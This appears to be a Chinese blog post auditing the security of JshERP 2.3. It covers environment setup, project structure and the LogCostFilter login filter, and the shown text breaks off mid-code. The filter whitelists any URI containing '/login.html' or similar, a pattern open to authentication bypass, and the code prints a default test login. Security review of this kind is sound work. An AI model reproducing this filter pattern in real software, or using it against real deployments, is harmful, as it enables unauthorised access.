

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
  <meta name="author" content="Xvsf">
  <meta name="keywords" content="">
  
    <meta name="description" content="华夏ERP 2.3 代码审计">
<meta property="og:type" content="article">
<meta property="og:title" content="华夏ERP 2.3 代码审计">
<meta property="og:url" content="http://xvshifu.github.io/2025/08/20/JshERP-2.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
<meta property="og:site_name" content="Xvsf blogs">
<meta property="og:description" content="华夏ERP 2.3 代码审计">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120917726.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348181.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348557.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348403.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120919189.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348041.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348213.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349294.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349044.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349541.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349763.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349971.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349969.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201349681.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350863.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350926.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201350041.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351643.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351506.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351332.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351023.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351524.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351288.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352184.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352076.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352144.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352547.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352250.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353028.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353100.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353445.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353146.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353446.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354889.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354762.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354110.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354842.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354949.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354239.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354668.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355700.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355478.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355029.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355391.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201356858.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357198.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357796.png">
<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/52403351/1755660382217-6998767d-c701-40dc-b102-1ac471e6c34e.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357525.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357263.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357816.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357155.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357019.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358852.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358742.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358810.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358804.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358551.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358132.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359218.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359675.png">
<meta property="article:published_time" content="2025-08-20T06:00:00.000Z">
<meta property="article:modified_time" content="2025-08-28T03:02:11.016Z">
<meta property="article:author" content="Xvsf">
<meta property="article:tag" content="Java 代码审计">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>华夏ERP 2.3 代码审计 - Xvsf blogs</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  



  
<link rel="stylesheet" href="/xm_custom/custom.css">



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 8.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>🖋️ Hello My Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/banner02.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="华夏ERP 2.3 代码审计"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-08-20 14:00" pubdate>
          2025年8月20日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.4k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          37 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">华夏ERP 2.3 代码审计</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2025年8月28日 上午
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/jishenghua/jshERP/releases/tag/2.3">https://github.com/jishenghua/jshERP/releases/tag/2.3</a></p>
<h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><p>MySQL 5.7.26，IDEA，Maven 3.9.1，JDK 1.8， </p>
<p>数据库新建jsh_erp数据库，导入sql文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347449.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201347937.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348745.png" srcset="/img/loading.gif" lazyload>IDEA 的 JDK 版本切换为1.8</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120917726.png" srcset="/img/loading.gif" lazyload></p>
<p>Maven构建</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348181.png" srcset="/img/loading.gif" lazyload></p>
<p>运行 ErpApplication.java 启动程序</p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348557.png" srcset="/img/loading.gif" lazyload><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348403.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508120919189.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="目录分析"><a href="#目录分析" class="headerlink" title="目录分析"></a>目录分析</h1><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348041.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201348213.png" srcset="/img/loading.gif" lazyload></p>
<p>这个项目的结构更像是 MVC 架构（ Mapper&#x2F;MapperXML； Controller  ），又增加了  Service 层 。</p>
<ul>
<li>Maven Assembly 插件，用于帮助打包； assembly.xml  是打包的配置文件</li>
<li>bin 中的文件都是 jshERP 的运行脚本</li>
<li>resources&#x2F;mapper_xml： MyBatis 框架的 SQL 映射配置文件， “数据库操作说明书”  </li>
<li>logback-spring.xml：日志文件输出配置</li>
<li>java<ul>
<li>config<ul>
<li><font style="color:#080808;background-color:#ffffff;">PluginBeanConfig.java  插件管理器 Bean</font></li>
<li><font style="color:#080808;background-color:#ffffff;">PluginConfiguration.java  配置插件系统的运行环境和参数  </font></li>
<li><font style="color:#080808;background-color:#ffffff;"> Swagger2Config.java      用于生成 RESTful API 文档 , 提供文档元信息  </font></li>
<li><font style="color:#080808;background-color:#ffffff;"> TenantConfig.java  项目数据库访问的</font>统一拦截器和插件配置中心</li>
<li>WebConfig.java 指定前端静态文件存放位置， 在 Spring Boot 内置 Web 服务器中生效</li>
</ul>
</li>
<li>constants     <ul>
<li>BusinessConstants  <font style="color:#080808;background-color:#ffffff;">业务字典类</font></li>
<li><font style="color:#080808;background-color:#ffffff;"> ExceptionConstants    异常与返回码管理类  </font></li>
</ul>
</li>
<li>controller      Web 层接口  </li>
<li>datasource      数据源和数据库访问配置  </li>
<li>exception    异常处理  </li>
<li>filter<ul>
<li>LogCostFilter   自定义 Servlet 过滤器， 控制用户访问权限和登录请求处理</li>
</ul>
</li>
<li>service     业务逻辑层  </li>
<li>utils    工具类  </li>
<li>ErpApplication.java    入口类，参考<a target="_blank" rel="noopener" href="https://www.yuque.com/taohuayuanpang/kfw7zl/cqdlt0kgwyh524ay#vrt3I">SpringBoot-注解 @SpringBootApplication 分析</a></li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//声明 springboot，组合了@SpringBootConfiguration @EnableAutoConfiguration @ComponentScann</span><br><span class="hljs-meta">@SpringBootApplication</span><br><span class="hljs-comment">//MyBatis Mapper 接口扫描路径</span><br><span class="hljs-meta">@MapperScan(&quot;com.jsh.erp.datasource.mappers&quot;)</span><br><span class="hljs-meta">@ServletComponentScan</span><br><span class="hljs-meta">@EnableScheduling</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErpApplication</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> SpringApplication.run(ErpApplication.class, args);<br>        <span class="hljs-type">Environment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> context.getBean(Environment.class);<br>        System.out.println(<span class="hljs-string">&quot;启动成功，访问地址：http://&quot;</span> + ComputerInfo.getIpAddr() + <span class="hljs-string">&quot;:&quot;</span><br>                           + environment.getProperty(<span class="hljs-string">&quot;server.port&quot;</span>) + <span class="hljs-string">&quot;，测试用户：jsh，密码：123456&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="1、LogCostFilter-java"><a href="#1、LogCostFilter-java" class="headerlink" title="1、LogCostFilter.java"></a>1、LogCostFilter.java</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.jsh.erp.filter;<br><br><span class="hljs-keyword">import</span> org.springframework.util.StringUtils;<br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebFilter;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebInitParam;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><span class="hljs-keyword">import</span> java.util.regex.Matcher;<br><span class="hljs-keyword">import</span> java.util.regex.Pattern;<br><br><span class="hljs-meta">@WebFilter(</span><br><span class="hljs-meta">    filterName = &quot;LogCostFilter&quot;,</span><br><span class="hljs-meta">    //过滤器对所有路径都生效</span><br><span class="hljs-meta">    urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">    initParams = &#123;</span><br><span class="hljs-meta">        //要忽略的静态资源</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">        //允许未登录访问的路径</span><br><span class="hljs-meta">        @WebInitParam(name = &quot;filterPath&quot;, value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)</span><br><span class="hljs-meta">    &#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogCostFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">FILTER_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;filterPath&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">IGNORED_PATH</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ignoredUrl&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; ignoredList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-keyword">private</span> String[] allowUrls;<br>    <span class="hljs-keyword">private</span> String[] ignoredUrls;<br><br>    <span class="hljs-comment">//将 filterPath 和 ignoredUrl 解析成 allowUrls 和 ignoredList（白名单），用于后续 doFilter 判断</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">filterPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(FILTER_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(filterPath)) &#123;<br>            allowUrls = filterPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? filterPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;filterPath&#125;;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">ignoredPath</span> <span class="hljs-operator">=</span> filterConfig.getInitParameter(IGNORED_PATH);<br>        <span class="hljs-keyword">if</span> (!StringUtils.isEmpty(ignoredPath)) &#123;<br>            ignoredUrls = ignoredPath.contains(<span class="hljs-string">&quot;#&quot;</span>) ? ignoredPath.split(<span class="hljs-string">&quot;#&quot;</span>) : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;ignoredPath&#125;;<br>            <span class="hljs-keyword">for</span> (String ignoredUrl : ignoredUrls) &#123;<br>                ignoredList.add(ignoredUrl);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response,</span><br><span class="hljs-params">                         FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">servletRequest</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">servletResponse</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">requestUrl</span> <span class="hljs-operator">=</span> servletRequest.getRequestURI();<br>        <span class="hljs-comment">//具体，比如：处理若用户未登录，则跳转到登录页</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">userInfo</span> <span class="hljs-operator">=</span> servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-keyword">if</span>(userInfo!=<span class="hljs-literal">null</span>) &#123; <span class="hljs-comment">//如果已登录，不阻止</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//未登录时允许访问的页面</span><br>        <span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>                                   requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// ignoredList</span><br>        <span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>            chain.doFilter(servletRequest, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">// allowUrls</span><br>        <span class="hljs-keyword">if</span> (<span 